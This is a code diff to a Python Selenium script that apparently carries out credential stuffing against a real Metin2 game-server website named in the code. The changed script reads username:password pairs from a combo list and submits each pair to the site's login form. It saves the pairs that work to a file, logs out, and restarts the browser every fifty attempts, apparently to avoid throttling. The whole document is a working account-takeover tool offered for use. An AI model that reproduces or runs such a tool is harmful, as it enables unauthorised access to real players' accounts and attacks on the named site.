@@ -67,10 +67,9 @@ class Module_Control(object):
             
 
 class Metin2_AutomationLogin(object):
-    def __init__(self, loginlist, passlist, webdriverpath, site):
+    def __init__(self, combolist, webdriverpath, site):
         colorama.init()
-        self.loginlist = loginlist
-        self.passlist = passlist
+        self.combolist = combolist
         self.webdriverpath = webdriverpath
         self.site = site
 
@@ -80,8 +79,8 @@ class Metin2_AutomationLogin(object):
     
     def LoginPassKontrol(self):
        try:
-            self.loginLC = open(self.loginlist, "r").readlines()
-            self.passLC = open(self.passlist, "r").readlines()
+            self.loginLC = open(self.combolist, "r").readlines()
+            self.passLC = open(self.combolist, "r").readlines()
        except (FileNotFoundError, ValueError):
             print("{0}[!]{1} {2}'Loginlist.txt' ve 'PassList.txt'{3} Dosyası Bulunamadı.".format(Fore.RED, Fore.RESET, Style.BRIGHT, Style.NORMAL))
        self.lcounter = 0
@@ -111,28 +110,31 @@ class Metin2_AutomationLogin(object):
         print("{0}[3]{1} {2}Exit".format(Fore.GREEN, Fore.RESET, Style.BRIGHT))
     
     def main(self):
+        self.isdontnot = False
+        self.counter = 0
         self.driver = webdriver.Firefox(executable_path=self.webdriverpath)
         self.driver.get(self.site)
-        self.soup = BeautifulSoup(self.driver.page_source, "lxml")
-        self.control = self.soup.find_all("div", attrs={"class":"navigation-block "})
         try:
-            self.loginL = open(self.loginlist, "r").readlines()
-            self.passL = open(self.passlist, "r").readlines()
+            self.loginL = open(self.combolist, "r").readlines()
+            self.save = open("düsenler.txt", "w")
         except FileNotFoundError:
             print("{0}[!]{1} {2}'Loginlist.txt' ve 'PassList.txt'{3} Dosyası Bulunamadı.".format(Fore.RED, Fore.RESET, Style.BRIGHT, Style.NORMAL))
-        for login in self.loginL:
-            for passwd in self.passL:
+        while not self.isdontnot:
+            for login in self.loginL:
+                self.login_log = login.strip().split(":")
+                if self.counter == 50:
+                    self.driver.quit()
+                    sleep(5)
+                    self.driver.get(self.site)
+                    self.counter = 0
+                    continue
                 try:
-                    print("{0}   [404]{1}".format(Fore.RED, Fore.RESET))
-                    print("Kullanıcı Adı : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, login, Fore.RESET), end="")
-                    print("Şifre : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, passwd, Fore.RESET), end="")
-                    print("\n")
                     self.findusername = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.NAME, "Username")))
-                    sleep(1)
-                    self.findusername.send_keys(login)
+                    sleep(5)
+                    self.findusername.send_keys(self.login_log[0])
                     self.findpassword = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.NAME, "Password")))
-                    sleep(1)
-                    self.findpassword.send_keys(passwd)
+                    sleep(5)
+                    self.findpassword.send_keys(self.login_log[1])
                     sleep(1.5)
                     self.findpassword.send_keys(Keys.ENTER)
                 except:
@@ -148,29 +150,37 @@ class Metin2_AutomationLogin(object):
                     sleep(0.5)
                     self.findpassword.send_keys(Keys.BACKSPACE)
                     print("{0}   [404]{1}".format(Fore.RED, Fore.RESET))
-                    print("Kullanıcı Adı : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, login, Fore.RESET), end="")
-                    print("Şifre : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, passwd, Fore.RESET), end="")
+                    print("Kullanıcı Adı : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, self.login_log[0], Fore.RESET), end="")
+                    print("Şifre : {0}{1}{2}{3}".format(Fore.RED, Style.BRIGHT, self.login_log[1], Fore.RESET), end="")
                     print("\n")
                 except:
-                    print(r"{0}[200]{1} Kullanıcı Adı : {2}{3}{4}{1} | Şifre : {2}{3}{5}{1}".format(Fore.GREEN, Fore.RESET, Fore.RED, Style.BRIGHT, str(login), str(passwd)))
-                    self.driver.quit()
-                    self.driver.get(self.site)
-                    sleep(5)
-        print("{0}[?]{1} Tüm İşlemler Bitti.".format(Fore.YELLOW, Fore.RESET))
+                    self.save.writelines(self.login_log[0]+":"+self.login_log[1]+"\n")
+                    print(r"{0}[200]{1} Kullanıcı Adı : {2}{3}{4}{1} | Şifre : {2}{3}{5}{1}".format(Fore.GREEN, Fore.RESET, Fore.RED, Style.BRIGHT, self.login_log[0], self.login_log[1]))
+                    self.logout = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, '//*[@id="LogoutButton"]')))
+                    sleep(1)
+                    self.logout.click()
+                self.counter += 1
+            print("{0}[?]{1} Tüm İşlemler Bitti.".format(Fore.YELLOW, Fore.RESET))
+            self.isdontnot = True
+    def control(self):
+        self.wordlist = open(self.combolist, "r").readlines()
+        for item in self.wordlist:
+            item_log = item.strip().split(":")
+            print("Kullanıcı Adı : {0} ve Şifre : {1}".format(item_log[0], item_log[1]))
+            
 
 if __name__ == "__main__":
-    loginlist = "loginlist.txt"
-    passlist = "passlist.txt"
+    combolist = "combolist.txt"
     webdriverpath = "geckodriver"
     site = "https://www.saltanatmt2.com.tr/"
     hours = datetime.now().strftime("%H")
     minutes = datetime.now().strftime("%M")
-    if platform.system == "Windows" or platform.system == "windows":
+    if name == "Windows_NT" or name == "windows_NT" or name == "win32" or name == "win64":
         system("cls")
     else:
-        system("clear")
+        system("cls")
     Module_Control.CONTROL()
-    start = Metin2_AutomationLogin(loginlist, passlist, webdriverpath, site)
+    start = Metin2_AutomationLogin(combolist, webdriverpath, site)
     start.AppMenu()
     choice = input("{0}Seçiminiz: ".format(Style.BRIGHT))
     if choice.isdigit():
@@ -178,7 +188,7 @@ if __name__ == "__main__":
         if choice == 1:
             start.main()
         elif choice == 2:
-            start.LoginPassKontrol()
+            start.control()
         elif choice == 3:
             pass
         else:
